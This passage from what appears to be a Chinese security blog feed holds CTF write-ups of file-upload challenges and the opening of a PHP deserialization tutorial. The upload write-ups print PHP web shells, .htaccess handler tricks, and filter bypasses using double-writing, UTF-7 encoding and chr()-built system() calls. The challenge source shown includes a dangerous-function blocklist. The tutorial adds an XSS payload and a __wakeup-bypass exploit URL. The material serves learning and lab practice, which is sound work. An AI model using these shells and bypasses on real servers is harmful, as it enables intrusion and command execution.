alt="abJwIH.png"></p><blockquote><p>或者</p><p>cat /flag</p><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716100628.png" alt="微信截图_20200716100628"></p></blockquote><h3 id="upload3"><a href="#upload3" class="headerlink" title="upload3"></a>upload3</h3><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p>发现php，eval，POST被替换为空，使用双写绕过。</p><p><img src="https://s1.ax1x.com/2020/08/10/abYTtH.png" alt="abYTtH.png"></p><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-pphphp .aaa</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?pphphp</span><br><span class="line">@eevalval($_PPOSTOST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><h3 id="upload4"><a href="#upload4" class="headerlink" title="upload4"></a>upload4</h3><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/08/10/abUytg.png" alt="abUytg.png"></p><p>发现没有上传。上传test.php和1.jpg（不是真的jpg文件）也都失败，尝试使用.user.ini绕过，结果提示：内容不能有file。</p><p>几次尝试后发现，它对文件内容进行检查，不能含有<code>&lt;?</code>，且无法用其它标签绕过。</p><p>尝试使用特殊编码绕过，上传.htaccess和1.aaa</p><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-</span><br></pre></td></tr></table></figure><p>在根目录下找到flag。</p><blockquote><p>找到flag之后查看php版本为：7.0.33</p><p>尝试发现：</p><p><img src="https://s1.ax1x.com/2020/08/11/aLcYOU.png" alt="aLcYOU.png"></p><p>由于版本为7.0以上且过滤掉<code>&lt;?</code>，所以无法使用其它标签绕过。</p></blockquote><h3 id="upload6"><a href="#upload6" class="headerlink" title="upload6"></a>upload6</h3><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><p>提示：内容不能有application</p><p>尝试使用.htaccess文件换行绕过。</p><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\</span><br><span class="line">cation&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><h3 id="upload7"><a href="#upload7" class="headerlink" title="upload7"></a>upload7</h3><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p>上传1.aaa 提示：不能含有危险函数！</p><p>使用burp suite抓包看看，发现eval和POST被过滤了。</p><p>尝试使用动态拼接函数绕过函数过滤，发现可以成功上传，然后访问该文件就可以得到flag。</p><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);</span><br><span class="line">$a(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = chr(<span class="number">115</span>).chr(<span class="number">121</span>).chr(<span class="number">115</span>).chr(<span class="number">116</span>).chr(<span class="number">101</span>).chr(<span class="number">109</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure><p>输出：system</p></blockquote><p>PS：</p><p>ctf-wscan下载地址：<a href="https://codeload.github.com/kingkaki/ctf-wscan/zip/master">https://codeload.github.com/kingkaki/ctf-wscan/zip/master</a></p><p>做题前可以先扫扫看有没有备份文件</p><p>像<code>robots.txt </code>、<code>www.zip</code>。</p><ul><li>使用扫描器扫描发现存在备份文件</li></ul><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716232655.png" alt="微信截图_20200716232655"></p><ul><li>下载备份文件</li></ul><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716232734.png" alt="微信截图_20200716232734"></p><ul><li>把<code>.index.php.swp</code>放到linux下使用vim -r恢复</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure><ul><li>得到源代码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;../upload&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>($i=strlen($s)<span class="number">-1</span>;$i&gt;<span class="number">0</span>;$i--)&#123;</span><br><span class="line">                $c=substr($s,$i,<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>($i == strlen($s)<span class="number">-1</span> <span class="keyword">and</span> $c != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> $s;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>($c != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> substr($s,<span class="number">0</span>,$i+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload=<span class="literal">false</span>;</span><br><span class="line">$msg=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext=<span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        $file_name=trim($_FILES[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name=deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext=strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext=strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext=str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext=trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file=$_FILES[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            </span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(phpinfo|system\(|eval\(|file_put_contents|file_get_contents|passthru|exec\(|chroot|scandir|proc_open|delfolder|unlink|mkdir|fopen|fread|fwrite|fputs|tmpfile|flock|chmod|delete|assert|_post|_get|_request|_file|create_function|array_walk|preg_replace|cookie)/Ui&quot;</span>,file_get_contents($temp_file)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不能含有危险函数！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> $img_path;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请重新上传！&#x27;</span>;</span><br><span class="line">        mkdir(UPLOAD_PATH,<span class="number">775</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化漏洞</title>
      <link href="2020/10/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/10/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p><p><strong>序列化</strong></p><ul><li><code>serialize()</code> 将对象转变成一个字符串便于之后的传递与使用。</li><li>序列化会保存对象所有的变量，但是不会保存对象的方法。</li></ul><p><strong>反序列化</strong></p><ul><li><code>unserialize()</code> 将序列化的结果恢复成对象。</li><li>反序列化一个对象，这个对象的类必须在反序列化之前定义，或者通过包含该类的定义或者使用 <code>spl_autoload_register()</code> (自动包含类)实现</li></ul><a id="more"></a><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。</p><h3 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h3><blockquote><p>PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。</p></blockquote><p>通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：</p><p><code>__construct</code> 当一个对象创建时自动调用</p><p><code>__wakeup</code> 使用unserialize()函数时会自动调用</p><p><code>__destruct</code> 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)</p><p><code>__toString</code> 当一个对象被当作一个字符串被调用。</p><p><code>__sleep()</code> 使用serialize()函数时触发</p><p><code>__call()</code>  在对象上下文中调用不可访问的方法时触发 </p><p><code>__callStatic()</code> 在静态上下文中调用不可访问的方法时触发</p><p><code>__get()</code> 用于从不可访问的属性读取数据</p><p><code>__set()</code> 用于将数据写入不可访问的属性</p><p><code>__isset()</code> 在不可访问的属性上调用isset()或empty()触发 </p><p><code>__unset()</code> 在不可访问的属性上使用unset()时触发</p><p><code>__toString()</code> 把类当作字符串使用时触发,返回值需要为字符串</p><p><code>__invoke()</code> 当脚本尝试将对象调用为函数时触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $varr1 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $varr2 = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> test();<span class="comment">//序列化对象，调用__construct()方法，输出__construct</span></span><br><span class="line">$obj-&gt;echoP();    <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> $obj;        <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line">$s = serialize($obj);   <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize($s);  <span class="comment">//$s首先会被反序列化，会调用__wakeup()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。 </span></span><br><span class="line"><span class="comment">//脚本结束销毁对象（$obj和反序列化的$s）时，又会调用__destruct()方法（两次），输出__destruct（两次）</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化漏洞例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;kawhi&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试构造序列化代码的时候插入xss</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $test = <span class="string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> A();</span><br><span class="line">$c = serialize($c);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125;</code></p><p><code>O</code>表示类型是object</p><p><code>1</code>表示object对应的类的名字的长度为1</p><p><code>“A”</code>表示类名</p><p><code>1</code>表示对应变量的个数</p><p><code>s</code>表示序列化后为字符串</p><p><code>4</code>表示字符串的长度</p><p><code>“test&quot;</code>表示表示变量名</p><p><code>s</code>表示变量test的类型</p><p><code>28</code>表示变量test的长度</p><p><code>&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</code>表示变量test的值</p><p><img src="https://s1.ax1x.com/2020/07/30/anGITe.png" alt="anGITe.png"></p><p>如果<code>__wakeup</code>中不是<code>echo()</code>，而是<code>eval()</code>，那么就是任意代码执行，危害就更大了。</p><h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h3><p><strong>一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数</strong></p><p>例：在网站根目录下有两个文件flag.php和test.php</p><p>test.php源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file = <span class="keyword">__FILE__</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;file !== <span class="keyword">__FILE__</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = <span class="keyword">__FILE__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">@unserialize($_REQUEST[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造序列化代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A;</span><br><span class="line">$b = serialize($a);</span><br><span class="line">print_r($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>如果直接进行正常的反序列化的话，即</p><blockquote><p><a href="http://127.0.0.1/test.php/?file=O:1:&quot;A&quot;:1:%7Bs:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;%7D">http://127.0.0.1/test.php/?file=O:1:&quot;A&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p></blockquote><p>页面没有其它变化，因为在使用unserialize()的时候自动调用__wakeup，将file替换为当前路径</p><p>php在解析属性长度的时候，若是出错</p><blockquote><p>将<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>改为</p><p><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p></blockquote><p>它并不会终止，而是继续执行，但不会调用__wakeup()</p><p>然后在销毁对象的时候自动调用__destruct()函数，高亮显示flag.php</p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="OC绕过"><a href="#OC绕过" class="headerlink" title="OC绕过"></a>OC绕过</h3><p>对test.php进行修改</p><p>对传进来的file进行过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 